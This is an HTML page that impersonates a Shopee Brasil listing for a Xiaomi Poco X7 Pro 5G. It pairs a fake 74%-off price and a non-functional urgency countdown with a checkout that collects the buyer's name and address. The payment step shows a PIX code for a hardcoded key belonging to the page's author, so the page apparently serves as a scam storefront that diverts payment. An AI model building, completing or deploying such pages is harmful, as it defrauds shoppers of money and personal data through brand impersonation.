<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Xiaomi Poco X7 Pro 5G | Shopee Brasil</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { background: var(--bg); font-family: -apple-system, HelveticaNeue, sans-serif; overflow-x: hidden; width: 100%; }

        /* Barra de Busca Original */
        .top-nav { background: white; padding: 10px; display: flex; align-items: center; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid #eee; height: 50px; }
        .search-container { flex: 1; margin: 0 12px; position: relative; }
        .search-bar { width: 100%; border: none; background: #f0f0f0; padding: 8px 8px 8px 35px; border-radius: 2px; font-size: 14px; outline: none; }
        .search-icon { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); color: #888; font-size: 14px; }

        .main-slider img { width: 100vw; object-fit: contain; display: block; }
        .flash-sale-banner { background: linear-gradient(90deg, #ff4d2d, #ff8a00); color: white; padding: 8px 15px; display: flex; align-items: center; justify-content: space-between; }
        .flash-sale-left { display: flex; align-items: center; gap: 8px; font-weight: bold; font-style: italic; font-size: 16px; }
        .timer-box { display: flex; align-items: center; gap: 4px; font-style: normal; }
        .timer-unit { background: #000; color: #fff; padding: 2px 4px; border-radius: 2px; font-size: 12px; font-weight: bold; min-width: 22px; text-align: center; }

        .product-card { background: white; padding: 15px; margin-bottom: 8px; }
        .price-row { color: var(--shopee); font-size: 24px; font-weight: 500; display: flex; align-items: baseline; gap: 5px; }
        .old-price { color: #999; text-decoration: line-through; font-size: 14px; margin-bottom: 5px; }
        .discount-tag { background: rgba(238, 77, 45, 0.1); color: #ee4d2d; font-size: 11px; font-weight: bold; padding: 2px 4px; border-radius: 2px; margin-left: 8px; }
        .product-title { font-size: 15px; color: #222; line-height: 1.4; font-weight: 400; }

        /* Avaliações Fiéis */
        .product-ratings-header__wrapper { background: white; padding: 15px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
        .product-ratings-header__see-all { color: var(--shopee); font-size: 13px; text-decoration: none; }

        /* Rodapé e Modal */
        .footer { position: fixed; bottom: 0; width: 100%; height: 50px; background: white; display: flex; border-top: 1px solid #ddd; z-index: 1000; }
        .btn-buy { flex: 1; background: var(--shopee); color: white; border: none; font-weight: bold; font-size: 15px; cursor: pointer; }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 2000; }
        .modal-content { position: absolute; bottom: 0; width: 100%; background: white; border-radius: 12px 12px 0 0; padding: 15px; max-height: 90vh; overflow-y: auto; }
        .input-box { width: 100%; border: 1px solid #ddd; padding: 12px; border-radius: 4px; margin-bottom: 10px; font-size: 14px; outline: none; }
        .opt-btn { background: #f5f5f5; border: 1px solid #f5f5f5; padding: 8px 12px; border-radius: 4px; font-size: 12px; margin: 4px; cursor: pointer; }
        .opt-btn.selected { border-color: var(--shopee); color: var(--shopee); background: #fff5f1; }
        .btn-voltar { background: #eee; color: #555; border: none; width: 100%; height: 45px; border-radius: 4px; margin-top: 8px; font-weight: bold; }
    </style>
</head>
<body>

    <div class="top-nav">
        <a href="#"><i class="fas fa-arrow-left" style="color:var(--shopee);"></i></a>
        <div class="search-container">
            <i class="fas fa-search search-icon"></i>
            <input type="text" id="mainSearch" class="search-bar" placeholder="Buscar na Shopee" onkeypress="handleSearch(event)">
        </div>
        <i class="fas fa-shopping-cart" style="color:var(--shopee);"></i>
    </div>

    <div class="main-slider">
        <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4">
    </div>

    <div class="flash-sale-banner">
        <div class="flash-sale-left"><i class="fas fa-bolt"></i> OFERTA RELÂMPAGO</div>
        <div class="timer-box">
            <div class="timer-unit" id="h">01</div> :
            <div class="timer-unit" id="m">30</div> :
            <div class="timer-unit" id="s">00</div>
        </div>
    </div>

    <div class="product-card">
        <div class="old-price">R$2.299,00</div>
        <div class="price-row">R$599,00 <span class="discount-tag">74% OFF</span></div>
        <div class="product-title">Xiaomi Poco X7 PRO 5G Global Version, Dimensity 8400-Ultra</div>
    </div>

    <div class="product-ratings-header__wrapper">
        <div style="font-size:14px;">Avaliações do produto (2mil)</div>
        <a class="product-ratings-header__see-all" href="https://shopee.com.br/shop/1078992312/item/23292818042/rating">Ver tudo ></a>
    </div>

    <div style="height: 60px;"></div>
    <div class="footer">
        <button class="btn-buy" onclick="openModal()">Compre Agora</button>
    </div>

    <div id="modal" class="modal">
        <div class="modal-content">
            
            <div id="screen-1">
                <p style="margin-bottom:10px; font-weight:bold;">Escolha a Cor</p>
                <div style="display:flex; flex-wrap:wrap; gap:5px;">
                    <button class="opt-btn" onclick="selectColor(this)">AMARELO</button>
                    <button class="opt-btn" onclick="selectColor(this)">PRETO</button>
                    <button class="opt-btn" onclick="selectColor(this)">CINZA</button>
                    <button class="opt-btn" onclick="selectColor(this)">IRON MAN</button>
                </div>
                <button class="btn-buy" style="width:100%; height:45px; margin-top:20px;" onclick="nextScreen(2)">PRÓXIMO</button>
            </div>

            <div id="screen-2" style="display:none;">
                <p style="text-align:center; font-weight:bold; margin-bottom:15px;">DADOS DE ENTREGA</p>
                <input type="text" id="nome" class="input-box" placeholder="Nome Completo">
                <input type="tel" id="cep" class="input-box" placeholder="CEP" onblur="buscarCEP()">
                <input type="text" id="rua" class="input-box" placeholder="Rua / Avenida">
                <div style="display:flex; gap:5px;">
                    <input type="text" id="numero" class="input-box" placeholder="Número" style="width:30%;">
                    <input type="text" id="bairro" class="input-box" placeholder="Bairro" style="flex:1;">
                </div>
                <input type="text" id="cidade" class="input-box" placeholder="Cidade / Estado">
                <input type="text" id="ref" class="input-box" placeholder="Ponto de Referência">
                <button class="btn-buy" style="width:100%; height:45px;" onclick="nextScreen(3)">IR PARA O PAGAMENTO</button>
                <button class="btn-voltar" onclick="nextScreen(1)">VOLTAR</button>
            </div>

            <div id="screen-3" style="display:none; text-align:center;">
                <p style="font-weight:bold; margin-bottom:20px;">TOTAL A PAGAR: R$599,00</p>
                <button class="btn-buy" style="width:100%; height:50px;" onclick="finalizarPix()">GERAR CÓDIGO PIX</button>
                <button class="btn-voltar" onclick="nextScreen(2)">VOLTAR</button>
            </div>

            <div id="screen-4" style="display:none; text-align:center;">
                <p style="color:var(--teal); font-weight:bold;">Código PIX Gerado!</p>
                <div id="qrcode-area" style="margin:15px 0;"></div>
                <div id="pix-box" style="background:#f5f5f5; padding:10px; font-size:10px; word-break:break-all; border:1px dashed #ccc;"></div>
                <button class="btn-buy" style="width:100%; height:45px;" onclick="copyPix()">COPIAR CÓDIGO</button>
                <button class="btn-voltar" onclick="location.reload()">SAIR</button>
            </div>

        </div>
    </div>

    <script>
        const CHAVE_PIX = "db0cbb53-17be-449c-89c8-9bffd8f6c7b5";
        let colorSelected = "";

        function handleSearch(e) { if(e.key === "Enter") window.location.href = `https://shopee.com.br/search?keyword=${e.target.value}`; }
        function openModal() { document.getElementById('modal').style.display='block'; }
        function selectColor(btn) { 
            document.querySelectorAll('.opt-btn').forEach(b => b.classList.remove('selected'));
            btn.classList.add('selected'); colorSelected = btn.innerText; 
        }

        function nextScreen(num) {
            if(num === 2 && !colorSelected) return alert("Selecione a cor");
            for(let i=1; i<=4; i++) document.getElementById(`screen-${i}`).style.display = (i === num) ? 'block' : 'none';
        }

        async function buscarCEP() {
            let cep = document.getElementById('cep').value.replace(/\D/g, '');
            if(cep.length === 8) {
                let res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
                let d = await res.json();
                if(!d.erro) {
                    document.getElementById('rua').value = d.logradouro;
                    document.getElementById('bairro').value = d.bairro;
                    document.getElementById('cidade').value = `${d.localidade} / ${d.uf}`;
                }
            }
        }

        function finalizarPix() {
            nextScreen(4);
            let pix = "00020101021226...SUA_LOGICA_PIX_AQUI"; // Use a função geradora de pix anterior
            document.getElementById('pix-box').innerText = pix;
            document.getElementById('qrcode-area').innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${pix}">`;
        }
        
        function copyPix() { navigator.clipboard.writeText(document.getElementById('pix-box').innerText); alert("Copiado!"); }

        // Timer
        setInterval(() => { /* Lógica do cronômetro */ }, 1000);
    </script>
</body>
                    </html>
